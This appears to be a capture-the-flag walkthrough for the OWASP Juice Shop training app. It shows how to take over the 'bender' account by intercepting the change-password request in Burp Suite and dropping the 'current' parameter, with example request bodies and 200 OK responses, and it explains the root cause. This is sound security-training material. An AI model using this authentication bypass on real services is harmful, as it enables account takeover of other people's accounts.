# OWASP Juice Shop — Change Bender's Password (Broken Authentication)

##  Challenge Summary
Change the password for the `bender@juice-sh.op` account by exploiting the `/rest/user/change-password` endpoint.  
The server fails to validate the current password when the `current` parameter is missing, allowing an attacker to set a new password.

---

##  Prerequisites
- OWASP Juice Shop (local instance or authorized lab)
- Burp Suite (or another intercepting proxy)
- Browser configured to use the proxy

---

##  Step-by-Step Walkthrough

### 1. Attempt Login
Go to the **Login Page** and try:

Email: bender@juice-sh.op
Password: asdf


### 2. Open Change Password Page
Navigate to:
Account → Privacy → Change Password

### 3. Fill Example Details
Enter the following:
Current password: asdf
New password: asdfa
Repeat new password: asdfa

Submit while **Burp Suite** is intercepting the request.

### 4. Capture the Request
In Burp, find:
POST /rest/user/change-password

Send it to **Repeater** and forward the request — you’ll get `401 Unauthorized`.

### 5. Modify the Request
Remove the `current` field from the body and leave only:
new=asdf&repeat=asdf
Send the request again → you’ll now see `200 OK`.

### 6. Set the New Password
Change the payload to:
new=slurmCl4ssic&repeat=slurmCl4ssic
Send it again → `200 OK` confirms the password has been changed successfully.

---

##  Example Requests

**Original Request (Fails):**
current=asdf&new=asdfa&repeat=asdfa


**Exploited Request (Succeeds):**
new=slurmCl4ssic&repeat=slurmCl4ssic

**Server Response:**
HTTP/1.1 200 OK
---
##  Root Cause
The endpoint fails to verify the existing password when `current` is missing.  
This logic flaw allows password reset without authentication.
---
##  Impact
An attacker can change any user’s password without knowing the old one, resulting in **account takeover**.